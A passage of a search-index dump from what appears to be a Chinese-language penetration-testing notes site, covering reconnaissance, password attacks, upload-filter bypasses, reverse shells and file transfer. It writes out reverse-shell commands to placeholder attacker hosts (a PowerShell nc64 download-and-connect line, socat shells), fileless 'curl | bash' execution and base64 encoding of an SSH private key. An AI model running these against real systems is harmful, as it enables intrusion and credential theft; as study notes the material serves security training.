<li>\u7ec4\u7ec7\uff08\u4eba\uff09\uff1a\u5458\u5de5\u8be6\u7ec6\u4fe1\u606f\u3001\u7535\u8bdd\u3001\u573a\u5730\u3001\u7ec4\u7ec7\u80cc\u666f\u3001\u5b89\u5168\u7b56\u7565\u3001\u6280\u672f\u6808\u7b49\u3002\u5176\u4ed6\u601d\u8def\uff1a\u80a1\u5e02/\u91d1\u878d\u4fe1\u606f\u7f51\u3001\u62db\u8058\u7f51\uff08\u4f01\u4e1a\u7684\u8f6f\u786c\u4ef6\uff09</li> </ul>"},{"location":"information-gathering/information-gathering/#_1","title":"\u6ce8\u610f","text":"<ul> <li>\u6b64\u8fc7\u7a0b\u662f\u5468\u671f\u6027\u7684\u800c\u975e\u7ebf\u6027\u7684</li> <li>\u8bb0\u7b14\u8bb0</li> </ul>"},{"location":"information-gathering/information-gathering/#_2","title":"\u5206\u7c7b","text":"<ul> <li>\u4e3b\u52a8</li> <li>\u88ab\u52a8</li> </ul>"},{"location":"information-gathering/information-gathering/#scanning","title":"Scanning\uff08\u626b\u63cf\uff09","text":"<p>\u76ee\u7684\uff1a\u8e29\u70b9\u83b7\u5f97\u4e86\u4e00\u5b9a\u4fe1\u606f\u4e4b\u540e\uff0c\u786e\u8ba4\u76ee\u6807\u7f51\u7edc\u8303\u56f4\u5185\u6709\u54ea\u4e9b\u7cfb\u7edf\u662f\u6d3b\u8dc3\u7684\uff0c\u4ee5\u53ca\u63d0\u4f9b\u4ec0\u4e48\u670d\u52a1\u2014\u2014\u4ece\u54ea\u91cc\u5165\u4fb5\u3001\u627e\u5165\u53e3</p> <ul> <li>\u5bf9\u6bd4\u8e29\u70b9\uff1a\u8e29\u70b9\u5c31\u662f\u641c\u96c6\u4fe1\u606f\u3001\u770b\u5468\u56f4\u73af\u5883\uff1b\u626b\u63cf\u5c31\u50cf\u786e\u8ba4\u5efa\u7b51\u7269\u4f4d\u7f6e\u3001\u6709\u54ea\u4e9b\u95e8\u7a97\u53ef\u8fdb\u5165</li> </ul>"},{"location":"information-gathering/information-gathering/#enumerate","title":"Enumerate\uff08\u679a\u4e3e\uff09","text":"<p>\u4e3a\u4e86\u8fdb\u4e00\u6b65\u83b7\u53d6\u76ee\u6807\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u5b9e\u65bdquery\u3002 \u5bf9\u8bc6\u522b\u51fa\u6765\u7684\u670d\u52a1\u8fdb\u884c\u66f4\u52a0\u5145\u5206\u66f4\u5177\u9488\u5bf9\u6027\u7684\u63a2\u67e5\uff0c\u6765\u5bfb\u627e\u771f\u6b63\u53ef\u4ee5\u653b\u51fb\u7684\u5165\u53e3\uff0c\u4ee5\u53ca\u653b\u51fb\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u9700\u8981\u7684\u5173\u952e\u6570\u636e\u3002  </p> <p>\u4e3b\u8981\u662f\u679a\u4e3e\u6709\u6548\u8d26\u53f7\u3001\u7f51\u7edc\u8d44\u6e90\uff08\u4e3b\u673a\u3001\u8bbe\u5907\u3001\u5171\u4eab\uff09\u3001\u8def\u7531\u3001SNMP\u3001\u914d\u7f6e\u7b49\u3002 \u679a\u4e3e\u6280\u672f\u5728\u5185\u7f51\u73af\u5883\u4e2d\u6267\u884c\uff08\u6ca1\u61c2\u8fd9\u53e5\u7684\u539f\u610f\uff0c\u53ef\u80fd\u662fCEH\u7684\u5b9a\u4e49\uff09\uff0c\u7528\u7684\u6280\u672f\u4f9d\u64cd\u4f5c\u7cfb\u7edf\u800c\u5b9a\u3002</p> <ul> <li>\u4e0e\u8e29\u70b9\u7684\u5173\u952e\u533a\u522b\uff1a\u653b\u51fb\u8005\u7684\u5165\u4fb5\u7a0b\u5ea6\u3002</li> <li>\u4e0e\u626b\u63cf\u7684\u5173\u952e\u533a\u522b\uff1a\u653b\u51fb\u8005\u7684\u9488\u5bf9\u6027\u4e0e\u4fe1\u606f\u641c\u96c6\u7684\u76ee\u6807\u6027\u3002 </li> </ul>"},{"location":"information-gathering/scanning/","title":"\u626b\u63cf","text":""},{"location":"information-gathering/scanning/#nmap","title":"nmap","text":"<p>link: MindMap of nmap</p>"},{"location":"information-gathering/scanning/#_1","title":"\u7f51\u7edc\u62d3\u6251","text":"<ul> <li>\u5de5\u5177\uff1aNetwork Topology Mapper</li> </ul>"},{"location":"information-gathering/summary/","title":"\u601d\u8def","text":""},{"location":"information-gathering/summary/#web_info_gathering","title":"web_info_gathering","text":"<ul> <li>\u7f51\u7ad9\u76ee\u5f55<ul> <li>\u524d\u63d0\uff1a\u7aef\u53e3\uff08\u56e0\u4e3a\u5176\u4ed6\u7aef\u53e3\u4e5f\u53ef\u80fd\u6709web\u670d\u52a1\uff09\uff0c\u5b50\u57df\u540d</li> <li>\u7f51\u7ad9\u6307\u7eb9\u8bc6\u522b\uff1a\u67d0\u4e9b\u5f00\u6e90\u7684\u53ef\u80fd\u5c31\u53ef\u4ee5\u4e0d\u7528\u4e13\u95e8\u53bb\u626b\u63cf\u76ee\u5f55\u4e86<ul> <li>whatapp</li> <li>wpscan</li> </ul> </li> </ul> </li> <li>\u524d\u7aef<ul> <li>\u4ee3\u7801\u6846\u67b6</li> <li>\u7ec4\u4ef6</li> <li>\u6ce8\u91ca</li> </ul> </li> <li>\u540e\u7aef<ul> <li>\u4ee3\u7801\u6846\u67b6</li> <li>\u7ec4\u4ef6</li> </ul> </li> <li>\u6570\u636e\u5e93</li> <li>\u670d\u52a1\u5668<ul> <li>IP/port</li> <li>\u670d\u52a1\u4fe1\u606f</li> </ul> </li> <li>\u5404\u90e8\u5206\u7684\u6f0f\u6d1e\u626b\u63cf\uff08TOPxx\uff09</li> </ul>"},{"location":"information-gathering/summary/#_2","title":"\u57df\u6e17\u900f\u601d\u8def","text":"<p>\u53c2\u8003\u8fd9\u7bc7WP\u7b14\u8bb0\uff1aHTB_APT</p>"},{"location":"initial-access/initial-access/","title":"\u7b80\u4ecb","text":""},{"location":"initial-access/initial-access/#_1","title":"\u65b9\u6cd5","text":"<ul> <li>\u6f0f\u6d1e\u5229\u7528</li> <li>\u5bc6\u7801\u7834\u89e3</li> </ul>"},{"location":"initial-access/initial-access/#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":"<ul> <li>\u53c2\u8003\u6f0f\u6d1e\u7f51\u7ad9</li> </ul>"},{"location":"initial-access/initial-access/#_3","title":"\u5bc6\u7801\u7834\u89e3","text":"<p>\u6ca1\u6f0f\u6d1e\u65f6\uff0c\u627e\u8ba4\u8bc1\u670d\u52a1\u83b7\u53d6\u8bbf\u95ee\u6743\u3002\u6240\u4ee5\uff1a\u7834\u89e3\u5bc6\u7801\u3002</p> <ul> <li>\u4e3a\u4ec0\u4e48\u6210\u529f\uff1a\u5f31\u5bc6\u7801\uff08 \u2192 \u4eba\u7684\u5f31\u70b9\uff09</li> </ul>"},{"location":"initial-access/initial-access/#_4","title":"\u7406\u89e3\u8ba4\u8bc1\u534f\u8bae","text":"<ul> <li>NTLM\uff1a\u53c2\u8003</li> <li>Kerberos\uff1a\u53c2\u8003</li> </ul>"},{"location":"initial-access/initial-access/#_5","title":"\u5bc6\u7801\u653b\u51fb\u7684\u7c7b\u578b","text":""},{"location":"initial-access/initial-access/#_6","title":"\u975e\u7535\u5b50/\u975e\u6280\u672f\u653b\u51fb","text":"<ul> <li>\u793e\u4f1a\u5de5\u7a0b\uff1a\u95ee</li> <li>\u30b7\u30e7\u30eb\u30c0\u30fc \u30b5\u30fc\u30d5\u30a3\u30f3\uff08shoulder surfing\uff09\uff1a\u5077\u770b</li> <li>\u30c0\u30f3\u30d7\u30b9\u30bf\u30fc \u30c0\u30a4\u30d3\u30f3\u30b0\uff08dumpster diving\uff09\uff1a\u627e\u7eb8\u4e0a\u8bb0\u5f55</li> </ul>"},{"location":"initial-access/initial-access/#online","title":"\u4e3b\u52a8online\u653b\u51fb","text":"<p>\u4e0d\u592a\u4f7f\u7528\uff0c\u6613\u88ab\u68c0\u6d4b\u3001\u66b4\u9732IP\u3001\u901f\u5ea6\u6162\uff08\u4e0a\u9650\u4e3a\u7f51\u901f\uff0c\u6240\u4ee5\u7528offline\uff09\u3001\u8d26\u6237\u88ab\u9501\u5b9a</p> <ul> <li>\u66b4\u7834\u3001\u63a8\u6d4b\u3001\u5b57\u5178</li> <li>\u6728\u9a6c\u3001\u952e\u76d8\u8bb0\u5f55\uff08\u4ece\u79bb\u7ebf\u67e5\u770b\u5185\u5bb9\u7684\u89d2\u5ea6\u6765\u8bf4\uff0c\u4e5f\u7b97offline\u3002\u770b\u600e\u4e48\u8003\u2026\u2026\uff09</li> <li>LLMNR/NBT-NS\u6bd2\u5316\uff1a\u7c7b\u6bd4ARP\u6bd2\u5316</li> <li>Hash Injection\uff08Pass the Hash\uff09\uff1a\u56e0\u4e3a\u662f\u5c06hash\u6ce8\u5165\u5230\u672c\u5730\u4f1a\u8bdd\u4e2d</li> <li>Internal Monologue\uff08\u5185\u90e8\u72ec\u767d\uff09\uff1aNetNTLM\u964d\u7ea7\u4e3aNetNTLMv1\uff0c\u83b7\u53d6NetNTLMv1\u54cd\u5e94\uff0c\u7528\u5982\u5f69\u8679\u8868\u7b49\u5de5\u5177\u7834\u89e3\uff0c\u83b7\u5f97NTLMhash\uff08\u4e4b\u540e\u4fbf\u53efPtH\uff09</li> <li>Kerberos\u5bc6\u7801\u653b\u51fb<ul> <li>\u9488\u5bf9TGT\uff1aAS-REP Roasting</li> <li>\u9488\u5bf9TGS\uff1aKerberoasting</li> </ul> </li> </ul>"},{"location":"initial-access/initial-access/#online_1","title":"\u88ab\u52a8online\u653b\u51fb","text":"<p>\u6307\u4e0d\u4e0e\u8ba4\u8bc1\u7cfb\u7edf\u901a\u4fe1\u7684\u5bc6\u7801\u653b\u51fb\u3002</p> <ul> <li>\u4e2d\u95f4\u4eba\u653b\u51fb\u3002\u8f83\u96be\u843d\u5730</li> <li>\u53cd\u5c04\u653b\u51fb</li> </ul>"},{"location":"initial-access/initial-access/#offline","title":"offline\u653b\u51fb","text":"<ul> <li>\u5f69\u8679\u8868</li> <li>\u9ed8\u8ba4\u5bc6\u7801\u67e5\u8be2\uff08\u90fd\u672a\u5c1d\u8bd5\u8fc7\uff0c\u5f88\u591a\u65f6\u5019\u76f4\u63a5\u8c37\u6b4c/\u6587\u6863\uff09<ul> <li>https://www.fortypoundhead.com</li> <li>https://cirt.net</li> <li>https://www.routerpasswords.com</li> <li>https://default-password.info</li> </ul> </li> </ul> <p>\u5bc6\u7801\u52a0\u76d0\uff1a\u5728\u660e\u6587\u5bc6\u7801\u91cc\u52a0\u5165\u968f\u673a\u5b57\u7b26\u540e\u518d\u8ba1\u7b97hash\u3002\u7531\u7cfb\u7edf\u52a0\u7684\u6240\u4ee5\u653b\u51fb\u8005\u96be\u4ee5\u5165\u624b\u3002\u4e0d\u8fc7Windows\u8ba4\u8bc1\u7cfb\u7edf\u4e0d\u4f1a\u52a0\u76d0\u3002</p>"},{"location":"initial-access/web/","title":"WEB","text":""},{"location":"initial-access/web/#_1","title":"\u6587\u4ef6\u4e0a\u4f20","text":""},{"location":"initial-access/web/#_2","title":"\u601d\u8def","text":"<p>Magic Number\uff1ahttps://en.wikipedia.org/wiki/List_of_file_signatures</p>"},{"location":"initial-access/web/#_3","title":"\u7ed5\u8fc7","text":"<p>\u9ed1\u540d\u5355\uff1a </p> <ul> <li>\u5927\u5c0f\u5199</li> <li>\u7a7a\u683c</li> <li>\u53cc\u540e\u7f00</li> <li>.htaccess</li> </ul> <p>\u767d\u540d\u5355\uff1a </p> <ul> <li>MIME\u7ed5\u8fc7</li> <li>Null\u7a7a\u5b57\u8282\u622a\u65ad\uff1a<code>\\x00</code> <code>%00</code> <code>0x0a</code></li> </ul>"},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/","title":"\u53cd\u5f39shell","text":"<p>\u5b9e\u7528\u7f51\u7ad9 - \u4e00\u952e\u751f\u6210\uff1a https://www.revshells.com/     - windows\u7528ps\u7684base64\u53ef\u80fd\u6709\u5947\u6548 - pentestmonkey - PayloadsAllTheThings</p> <p></p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#netcat","title":"Netcat","text":"","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#msfvenom","title":"Msfvenom","text":"<p>metasploit</p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#socat","title":"Socat","text":"<p>https://tryhackme.com/room/introtoshells</p> <p>\u5f3a\u5316\u7248nc\u3002\u4f46\u9ed8\u8ba4\u4e00\u822c\u90fd\u6ca1\u5b89\u88c5\uff0c\u4e14\u8bed\u6cd5\u8f83\u96be\u3002\u7406\u89e3 socat \u7684\u6700\u7b80\u5355\u65b9\u6cd5\u662f\u4f5c\u4e3a\u4e24\u70b9\u4e4b\u95f4\u7684\u8fde\u63a5\u5668\u3002</p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#_1","title":"\u57fa\u7840\u8bed\u6cd5","text":"","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#shell","title":"\u53cd\u5f39shell","text":"<p>\u653b\u51fb\u673a\u76d1\u542c\uff1a <code>socat TCP-L:&lt;port&gt; -</code>\u3002\u4e0d\u7a33\u5b9a\uff0c\u7b49\u6548\u4e8e <code>nc -lvnp &lt;port&gt;</code>\u3002</p> <ul> <li>\u4e24\u70b9\uff1a\u76d1\u542c\u7aef\u53e3\u548c\u6807\u51c6\u8f93\u5165\u3002</li> <li>TCP\uff1a\u53ef\u5f53\u505a\u547d\u4ee4\u7684\u4e00\u90e8\u5206\uff08\u57fa\u672c\u90fd\u4f1a\u7528\u5230\uff09</li> <li>-L\uff1a\u6307listener</li> <li>-\uff1a\u4e5f\u662f\u4e00\u4e2aoption</li> </ul> <p>Windows\u76ee\u6807\uff1a <code>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:powershell.exe,pipes</code></p> <p>The \"pipes\" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.</p> <p>Linux\u76ee\u6807\uff1a <code>socat TCP:&lt;LOCAL-IP&gt;:&lt;LOCAL-PORT&gt; EXEC:\"bash -li\"</code></p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#shell_1","title":"\u7ed1\u5b9ashell","text":"<p>Windows\u76ee\u6807\uff1a <code>socat TCP-L:&lt;PORT&gt; EXEC:powershell.exe,pipes</code></p> <p>the \"pipes\" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.</p> <p>Linux\u76ee\u6807\uff1a <code>socat TCP-L:&lt;PORT&gt; EXEC:\"bash -li\"</code></p> <p>\u653b\u51fb\u673a\u8fde\u63a5\uff1a <code>socat TCP:&lt;TARGET-IP&gt;:&lt;TARGET-PORT&gt; -</code></p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#_2","title":"\u8fdb\u9636\u8bed\u6cd5","text":"","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#linux-tty-shell","title":"\u5f3a\u5927\u7528\u9014\u4e4b\u4e00\uff1a\u5b8c\u5168\u7a33\u5b9a\u7684Linux tty \u53cd\u5f39shell","text":"","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#shell_2","title":"\u521b\u5efa\u52a0\u5bc6shell","text":"<p>\u9664\u975e\u6709\u5bc6\u94a5\u5426\u5219\u65e0\u6cd5\u88ab\u4fa6\u6d4b\u2014\u2014\u7ed5IDS\u3002</p> <p>\u5373\u628a\u57fa\u7840\u8bed\u6cd5\u547d\u4ee4\u884c\u7684 <code>TCP</code> \u66ff\u6362\u4e3a <code>OPENSSL</code>\u3002</p> <ol> <li>\u5173\u4e8e\u8bc1\u4e66\uff08certificates\uff09</li> </ol> <p>\u9996\u5148\uff0c\u8981\u5728\u653b\u51fb\u673a\u751f\u6210\u8bc1\u4e66\u3002</p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#windows","title":"Windows","text":"","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#nc64-f2016a","title":"\u4f20\u9012nc64\u53cd\u8fde ^f2016a","text":"<p><pre><code>powershell -noprofile -Command \"Invoke-WebRequest http://10.10.x.x/nc64.exe -OutFile C:\\Users\\Public\\nc64.exe\" &amp; C:\\Users\\Public\\nc64.exe 10.10.x.x 4444 -e powershell\n</code></pre> - nc\u4e0d\u884c\u53ef\u4ee5\u8bd5\u8bd5ncat - \u5207\u6362\u7528\u6237\uff1a\u6ce8\u610f[[\u6a2a\u5411#RunasCs]]\u7684\u5999\u7528</p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#_3","title":"\u4ea4\u4e92\u5f0f","text":"<p>\u901a\u5e38\u53cd\u5f39shell\u90fd\u662f\u975e\u4ea4\u4e92\u5f0f\u7684\u2014\u2014\u610f\u5473\u7740\u65e0\u6cd5\u4f7f\u7528\u4ea4\u4e92\u5f0f\u547d\u4ee4\uff08\u5982ssh\uff0c\u4e0d\u4f1a\u663e\u793a\u662f\u5426\u52a0\u5165\u65b0\u7684\u516c\u94a5\uff09</p> <p></p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#upgrading-tty","title":"Upgrading TTY","text":"<p>https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#python","title":"python","text":"<p>upgrade to a pseudo TTY</p> <p>\u8bd5\u4e86\u4e0b\u5c31\u8fd9\u4e2a\u6700\u597d\u7528\u3002\u5176\u4ed6\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u4e0d\u652f\u6301tab\u952e\u3002</p> <pre><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>Ctrl+Z,  stty raw -echo; fg; reset\n\nexport TERM=xterm-256color\nexport SHELL=bash\n</code></pre> <p>\u6b64\u65f6\u53cd\u5f39shell\u5e76\u6ca1\u6709\u8986\u76d6\u6574\u4e2a\u7ec8\u7aef <pre><code># \u5728\u81ea\u5df1\u7684\u7ec8\u7aef\u786e\u8ba4\u5927\u5c0f\nstty size\n\n# \u5728\u53cd\u5f39shell\u914d\u7f6e\u7ec8\u7aef\u5927\u5c0f\nstty rows 47 columns 176\n</code></pre></p> <ul> <li>stty\uff1aSet TeleTYpewriter</li> <li>\u5173\u95ed\u653b\u51fb\u7aef\u7684\u7ec8\u7aef\u56de\u663e\uff08terminal echo\u3002\u5373tab\u3001\u65b9\u5411\u952e\u3001Ctrl+C\u529f\u80fd\uff0c\u4e4b\u540e\u4fbf\u53ef\u5728\u53cd\u5f39shell\u91cc\u4f7f\u7528\uff09</li> <li>\u8981\u6062\u590d\u56de\u663e\uff1areset\uff0c\u56de\u8f66\u3002\uff08\u4e0a\u9762\u547d\u4ee4\u81ea\u52a8\u5316\u4e86\uff0c\u9000\u51fa<code>fg</code>\u7684shell\u540e\u81ea\u52a8\u6267\u884c<code>reest</code>\uff09</li> </ul>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#script","title":"script","text":"<p><code>script /dev/null -c bash</code></p> <p>What Happens In a \"Shell Upgrade\"?</p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#sh","title":"sh","text":"<ul> <li><code>/bin/sh -i</code></li> <li><code>/bin/bash -i</code></li> </ul> <p>[!note] \u4e0b\u9762\u4e5f\u53ef\u4ee5\u4e92\u6362sh/bash\u8fdb\u884c\u5c1d\u8bd5</p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#awk","title":"awk","text":"<p>\u4f3c\u4e4e\u4e0d\u548b\u597d\u7528\uff08\u5e76\u4e0d\u662f\u4ea4\u4e92\u5f0f\uff0c\u4e5f\u6ca1\u6709prompt\u7b26\uff0c\u4f46\u786e\u5b9e\u6709\u751f\u6210\u65b0\u7684shell\u2014\u2014\u7528<code>ps</code>\u53ef\u786e\u8ba4\u6709\u6548\u3002\u4e0b\u540c\uff09</p> <p><code>awk 'BEGIN {system(\"/bin/bash\")}'</code></p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#perl","title":"perl","text":"<p>\u4f3c\u4e4e\u4e0d\u548b\u597d\u7528</p> <p><code>perl -e 'exec \"/bin/bash\";'</code></p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#find","title":"find","text":"<p>\u4f3c\u4e4e\u4e0d\u548b\u597d\u7528\uff0c\u7528\u4e8e\u7ed5\u8fc7\uff1f</p> <p><code>find . -name nameoffile -exec /bin/awk 'BEGIN {system(\"/bin/bash\")}' \\; 2&gt;/dev/null</code></p> <p>[!note] This use of the find command uses the execute option (<code>-exec</code>) to initiate the shell interpreter directly. If\u00a0<code>find</code>\u00a0can't find the specified file, then no shell will be attained.</p> <p>\u6240\u4ee5\u7528\u8fd9\u4e2a\uff1a<code>find . -exec /bin/bash \\; -quit</code>\u3002\u6ca1\u6709\u6307\u5b9a\u7279\u5b9a\u7684\u67e5\u627e\u6761\u4ef6\uff0c\u6240\u4ee5\u5b83\u4f1a\u627e\u5230\u5f53\u524d\u76ee\u5f55\u53ca\u5176\u5b50\u76ee\u5f55\u4e2d\u7684\u7b2c\u4e00\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55</p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#vim","title":"vim","text":"<p><code>vim -c ':!/bin/sh'</code></p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#python_1","title":"\u5728python\u5185\u90e8\u65f6","text":"<p><code>echo os.system('/bin/bash')</code></p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#rlwrapwindows","title":"rlwrap\uff1a\u5bf9Windows\u5f88\u6709\u7528","text":"<p>kali\u9ed8\u8ba4\u6ca1\u6709\u3002\u5b89\u88c5\uff1a<code>sudo apt install rlwrap</code></p> <p><code>rlwrap nc -lvnp 4444</code></p> <p>\u4f7f\u7528 <code>rlwrap</code> \u53ef\u4ee5\u8ba9\u7528\u6237\u5728\u8fd0\u884c\u90a3\u4e9b\u672c\u8eab\u4e0d\u652f\u6301\u547d\u4ee4\u884c\u7f16\u8f91\u6216\u5386\u53f2\u8bb0\u5f55\uff08\u5982\u65b9\u5411\u952e\u4e0a\u4e0b\u5de6\u53f3\uff09\u7684\u7a0b\u5e8f\u65f6\uff0c\u4ecd\u7136\u80fd\u591f\u4eab\u53d7\u5230\u8fd9\u4e9b\u4fbf\u5229\u7684\u529f\u80fd\u3002\uff08tab\u81ea\u52a8\u8865\u5168\u8fd8\u662f\u4e0d\u884c\uff09 - rl\uff1areadlines</p> <p>\u7ed9nc\u5957\u4e86\u4e00\u4e2a\u66f4\u4e3a\u5065\u5168\u7684shell\u3002 \u5bf9linux\u65f6\uff0c\u4e5f\u53ef\u4ee5 <code>Ctrl+Z, stty raw -echo; fg; reset</code> \u4f7f\u5176\u66f4\u7a33\u5b9a\u3002</p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#socat_1","title":"Socat","text":"<p>\u5148\u8fdb\u5165nc shell\u4f5c\u4e3a\u57ab\u811a\u77f3</p> <p>\u5c06socat\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u4f20\u5230\u76ee\u6807\u673a\uff08\u56e0\u4e3a\u57fa\u672c\u9ed8\u8ba4\u6ca1\u88c5\uff09</p> <p>A\u00a0standalone binary\u00a0of\u00a0<code>Socat</code>\u00a0can be transferred to a system after obtaining remote code execution to get a more stable reverse shell connection.</p> <ul> <li>\u4e8c\u8fdb\u5236\u6587\u4ef6\uff1a<code>wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true</code></li> </ul> <p>\u6587\u4ef6\u4f20\u8f93\u7684\u65b9\u6cd5\u53c2\u7167\uff1aFileTransfers-Linux\u3001FileTransfers-Windows</p> <p>[!NOTE] Windows\u4e0a\u4f3c\u4e4esocat\u4e0d\u6bd4nc\u7a33\u5b9a</p>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"initial-access/%E5%8F%8D%E5%BC%B9shell/#tty","title":"\u66f4\u6539\u7ec8\u7aef tty\u5927\u5c0f","text":"<p>\u8fd9\u662f\u60a8\u7684\u7ec8\u7aef\u5728\u4f7f\u7528\u5e38\u89c4 shell \u65f6\u4f1a\u81ea\u52a8\u6267\u884c\u7684\u64cd\u4f5c\uff1b\u4f46\u662f\uff0c\u5982\u679c\u60a8\u60f3\u4f7f\u7528\u6587\u672c\u7f16\u8f91\u5668\u4e4b\u7c7b\u7684\u4e1c\u897f\u6765\u8986\u76d6\u5c4f\u5e55\u4e0a\u7684\u6240\u6709\u5185\u5bb9\uff0c\u5219\u5fc5\u987b\u5728\u53cd\u5411\u6216\u7ed1\u5b9a shell \u4e2d\u624b\u52a8\u5b8c\u6210\u6b64\u64cd\u4f5c\u3002</p> <ul> <li><code>stty -a</code>\uff1a\u67e5\u770b\u6240\u6709\u914d\u7f6e</li> <li><code>stty rows &lt;number&gt;</code></li> <li><code>stty cols &lt;number&gt;</code></li> </ul>","tags":["\u6e17\u900f/\u5229\u7528"]},{"location":"post-exploitation/ClearingTracks/","title":"\u75d5\u8ff9\u6e05\u7406","text":"<p>Waiting...</p>"},{"location":"post-exploitation/FileTransfers-Linux/","title":"Linux","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#_1","title":"\u5178\u578b\u65b9\u6cd5","text":"<p>\u6253\u5f00\u7f51\u7edc\u670d\u52a1\u5668\uff1a</p> <ul> <li><code>python3 -m http.server 80</code></li> <li><code>python2.7 -m SimpleHTTPServer</code></li> <li><code>php -S 0.0.0.0:8000</code></li> <li><code>ruby -run -ehttpd . -p8000</code></li> </ul> <p>\u5ba2\u6237\u7aef\uff1a</p> <ul> <li>Linux\u76ee\u6807\u673a\uff1aFileTransfers-Linux#Download</li> <li>Windows\u76ee\u6807\u673a\uff1aFileTransfers-Windows#PowerShell Web Downloads</li> </ul> <p>Netcat#\u6587\u4ef6\u4f20\u8f93</p> <p>\u53e6\u5916\uff0c\u53ef\u7528\u7b80\u5355\u7684\u5355\u884c\u4ee3\u7801\u3002</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#download","title":"Download","text":"","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#base64","title":"Base64","text":"<p><pre><code>cat id_rsa |base64 -w 0;echo (\u6216 base64 id_rsa -w 0)\n\necho -n &lt;base64-sting&gt; | base64 -d &gt; file\n</code></pre>  - \u6ce8\u610f\u9a8c\u8bc1MD5</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#web-downloads-with-wget-and-curl","title":"Web Downloads with Wget and cURL","text":"<p>\u4e00\u822c\uff1a<code>wget</code>\u548c<code>curl</code>\u76f4\u63a5\u4e0b\u8f7d\u3002</p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#fileless-download-with-curl","title":"Fileless Download with cURL","text":"<p><code>curl &lt;url/shell.sh&gt; | bash</code></p>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#fileless-download-with-wget","title":"Fileless Download with wget","text":"<p><code>wget -qO- &lt;url/shell.py&gt; | python3</code></p> <ul> <li><code>-O-</code>\uff1aoutput\u5230\u6807\u51c6\u8f93\u51fa\u3002</li> </ul>","tags":["\u6e17\u900f/\u5229\u7528","IT/Linux","\u6e17\u900f/CPTS","\u6e17\u900f/\u540e\u6e17\u900f"]},{"location":"post-exploitation/FileTransfers-Linux/#bash-devtcp","title":"Bash (/dev/tcp)","text":"<p>As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file 